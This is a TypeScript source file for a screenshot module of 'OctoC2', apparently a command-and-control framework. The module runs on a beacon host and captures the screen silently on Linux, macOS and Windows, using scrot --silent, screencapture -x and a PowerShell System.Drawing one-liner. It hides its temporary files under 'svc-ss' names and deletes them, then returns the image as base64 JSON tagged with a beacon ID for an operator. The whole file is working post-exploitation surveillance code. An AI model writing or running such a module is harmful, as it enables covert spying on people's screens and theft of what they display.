#!/usr/bin/env bun
/**
 * OctoC2 screenshot module — real implementation with platform fallbacks.
 *
 * Capture hierarchy:
 *   Linux  : scrot → import (ImageMagick) → xwd+convert → placeholder
 *   macOS  : screencapture → placeholder
 *   Windows: PowerShell Add-Type screenshot → placeholder
 *   Other  : placeholder
 *
 * Output: single JSON line on stdout.
 * Fields: beaconId, status, platform, format, width, height, data (base64), message, collectedAt
 *   status: "captured" | "stub"
 *   data:   PNG bytes as base64 (present when status="captured")
 *
 * Compile:
 *   octoctl module build screenshot --beacon <id> \
 *     --source ./modules/screenshot.ts --server-url <url>
 */

import { execSync, spawnSync } from "node:child_process";
import { readFileSync, unlinkSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join }   from "node:path";

const TIMEOUT_MS = 15_000;

// ── Helpers ───────────────────────────────────────────────────────────────────

function which(cmd: string): boolean {
  try {
    execSync(`which ${cmd}`, { stdio: "ignore", timeout: 3_000 });
    return true;
  } catch { return false; }
}

function tryCapture(
  cmd: string[],
  outFile: string,
): boolean {
  const result = spawnSync(cmd[0]!, cmd.slice(1), {
    timeout: TIMEOUT_MS,
    stdio:   ["ignore", "ignore", "ignore"],
  });
  return result.status === 0 && existsSync(outFile);
}

function readBase64(path: string): string {
  const buf = readFileSync(path);
  return buf.toString("base64");
}

function removeSafe(path: string): void {
  try { unlinkSync(path); } catch {}
}

// ── Resolution probe (PNG IHDR) ────────────────────────────────────────────────

function parsePngDimensions(b64: string): { width: number; height: number } | null {
  try {
    const buf = Buffer.from(b64, "base64");
    // PNG signature is 8 bytes; IHDR chunk starts at offset 8
    // IHDR: length(4) + "IHDR"(4) + width(4) + height(4)
    if (buf.length < 24) return null;
    const width  = buf.readUInt32BE(16);
    const height = buf.readUInt32BE(20);
    return { width, height };
  } catch { return null; }
}

// ── Platform capture ──────────────────────────────────────────────────────────

interface CaptureResult {
  status:  "captured" | "stub";
  format:  "png" | null;
  data:    string | null;
  message: string;
  width:   number | null;
  height:  number | null;
}

function captureLinux(): CaptureResult {
  const tmp = join(tmpdir(), `svc-ss-${Date.now()}.png`);
  try {
    // Method 1: scrot (lightweight X11 screenshot tool)
    if (which("scrot")) {
      if (tryCapture(["scrot", "--silent", tmp], tmp)) {
        const data = readBase64(tmp);
        const dims = parsePngDimensions(data);
        removeSafe(tmp);
        return { status: "captured", format: "png", data, message: "scrot", ...dims ?? { width: null, height: null } };
      }
    }

    // Method 2: import from ImageMagick (works on X11)
    if (which("import")) {
      if (tryCapture(["import", "-window", "root", "-silent", tmp], tmp)) {
        const data = readBase64(tmp);
        const dims = parsePngDimensions(data);
        removeSafe(tmp);
        return { status: "captured", format: "png", data, message: "import (ImageMagick)", ...dims ?? { width: null, height: null } };
      }
    }

    // Method 3: xwd → convert (fallback)
    if (which("xwd") && which("convert")) {
      const xwdTmp = join(tmpdir(), `svc-ss-${Date.now()}.xwd`);
      if (tryCapture(["xwd", "-root", "-silent", "-out", xwdTmp], xwdTmp)) {
        if (tryCapture(["convert", xwdTmp, tmp], tmp)) {
          const data = readBase64(tmp);
          const dims = parsePngDimensions(data);
          removeSafe(tmp);
          removeSafe(xwdTmp);
          return { status: "captured", format: "png", data, message: "xwd+convert", ...dims ?? { width: null, height: null } };
        }
        removeSafe(xwdTmp);
      }
    }

    // Method 4: gnome-screenshot
    if (which("gnome-screenshot")) {
      if (tryCapture(["gnome-screenshot", "--file", tmp], tmp)) {
        const data = readBase64(tmp);
        const dims = parsePngDimensions(data);
        removeSafe(tmp);
        return { status: "captured", format: "png", data, message: "gnome-screenshot", ...dims ?? { width: null, height: null } };
      }
    }
  } catch {
    removeSafe(tmp);
  }

  return {
    status: "stub", format: null, data: null,
    message: "No screenshot tool available (tried scrot, import, xwd+convert, gnome-screenshot). Is DISPLAY set?",
    width: null, height: null,
  };
}

function captureMacos(): CaptureResult {
  const tmp = join(tmpdir(), `svc-ss-${Date.now()}.png`);
  try {
    // screencapture: -x suppresses sound, -t png forces PNG
    if (tryCapture(["screencapture", "-x", "-t", "png", tmp], tmp)) {
      const data = readBase64(tmp);
      const dims = parsePngDimensions(data);
      removeSafe(tmp);
      return { status: "captured", format: "png", data, message: "screencapture", ...dims ?? { width: null, height: null } };
    }
  } catch {
    removeSafe(tmp);
  }
  return {
    status: "stub", format: null, data: null,
    message: "screencapture failed (headless macOS or permissions issue)",
    width: null, height: null,
  };
}

function captureWindows(): CaptureResult {
  const tmp = join(tmpdir(), `svc-ss-${Date.now()}.png`).replace(/\//g, "\\");
  // PowerShell one-liner: use .NET System.Drawing to capture the screen
  const ps = [
    "Add-Type -AssemblyName System.Drawing;",
    "$s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;",
    "$b = New-Object System.Drawing.Bitmap($s.Width, $s.Height);",
    "$g = [System.Drawing.Graphics]::FromImage($b);",
    "$g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size);",
    `$b.Save('${tmp}');`,
  ].join(" ");

  try {
    const result = spawnSync("powershell.exe", ["-NoProfile", "-Command", ps], {
      timeout: TIMEOUT_MS, stdio: ["ignore", "ignore", "ignore"],
    });
    if (result.status === 0 && existsSync(tmp)) {
      const data = readBase64(tmp);
      const dims = parsePngDimensions(data);
      removeSafe(tmp);
      return { status: "captured", format: "png", data, message: "PowerShell System.Drawing", ...dims ?? { width: null, height: null } };
    }
  } catch {}
  return {
    status: "stub", format: null, data: null,
    message: "PowerShell screenshot failed (headless or permissions issue)",
    width: null, height: null,
  };
}

// ── Main ──────────────────────────────────────────────────────────────────────

let capture: CaptureResult;
switch (process.platform) {
  case "linux":   capture = captureLinux();   break;
  case "darwin":  capture = captureMacos();   break;
  case "win32":   capture = captureWindows(); break;
  default:
    capture = {
      status: "stub", format: null, data: null,
      message: `Screenshot not implemented on ${process.platform}.`,
      width: null, height: null,
    };
}

const output = {
  beaconId:    process.env["OCTOC2_BEACON_ID"] ?? "unknown",
  status:      capture.status,
  platform:    process.platform,
  format:      capture.format,
  width:       capture.width,
  height:      capture.height,
  // data is large — omit key entirely when null to keep JSON clean
  ...(capture.data !== null ? { data: capture.data } : {}),
  message:     capture.message,
  collectedAt: new Date().toISOString(),
};

process.stdout.write(JSON.stringify(output) + "\n");
